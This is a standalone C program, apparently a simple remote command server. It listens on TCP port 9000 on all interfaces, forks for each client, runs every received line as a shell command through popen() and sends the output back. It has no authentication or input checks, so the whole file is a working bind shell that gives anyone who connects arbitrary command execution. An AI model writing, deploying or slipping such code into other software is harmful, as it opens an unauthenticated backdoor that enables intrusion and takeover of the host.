#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>

#define PORT 9000
#define BUFFER_SIZE 4096

void handle_client(int client_sock) {
    char buffer[BUFFER_SIZE];

    while (1) {
        memset(buffer, 0, sizeof(buffer));

        int bytes = recv(client_sock, buffer, sizeof(buffer), 0);

        if (bytes <= 0) {
            printf("Client disconnected\n");
            break;
        }

        buffer[strcspn(buffer, "\n")] = '\0';

        if (strcmp(buffer, "exit") == 0) {
            break;
        }

        printf("Command received: %s\n", buffer);

        FILE *fp;
        char result[BUFFER_SIZE];

        fp = popen(buffer, "r");

        if (fp == NULL) {
            char *msg = "Failed to execute command\n";
            send(client_sock, msg, strlen(msg), 0);
            continue;
        }

        memset(result, 0, sizeof(result));

        while (fgets(result, sizeof(result), fp) != NULL) {
            send(client_sock, result, strlen(result), 0);
            memset(result, 0, sizeof(result));
        }

        pclose(fp);

        send(client_sock, "END_OF_OUTPUT\n", 14, 0);
    }

    close(client_sock);
}

int main() {
    int server_sock, client_sock;
    struct sockaddr_in server_addr, client_addr;
    socklen_t addr_size;

    server_sock = socket(AF_INET, SOCK_STREAM, 0);

    if (server_sock < 0) {
        perror("Socket error");
        exit(1);
    }

    printf("Socket created\n");

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    server_addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(server_sock,
             (struct sockaddr*)&server_addr,
             sizeof(server_addr)) < 0) {
        perror("Bind error");
        exit(1);
    }

    printf("Bind success\n");

    listen(server_sock, 5);

    printf("Server listening on port %d...\n", PORT);

    while (1) {
        addr_size = sizeof(client_addr);

        client_sock = accept(server_sock,
                             (struct sockaddr*)&client_addr,
                             &addr_size);

        if (client_sock < 0) {
            perror("Accept error");
            continue;
        }

        printf("Client connected\n");

        pid_t pid = fork();

        if (pid == 0) {
            close(server_sock);

            handle_client(client_sock);

            exit(0);
        } else {
            close(client_sock);

            while (waitpid(-1, NULL, WNOHANG) > 0);
        }
    }

    close(server_sock);

    return 0;
}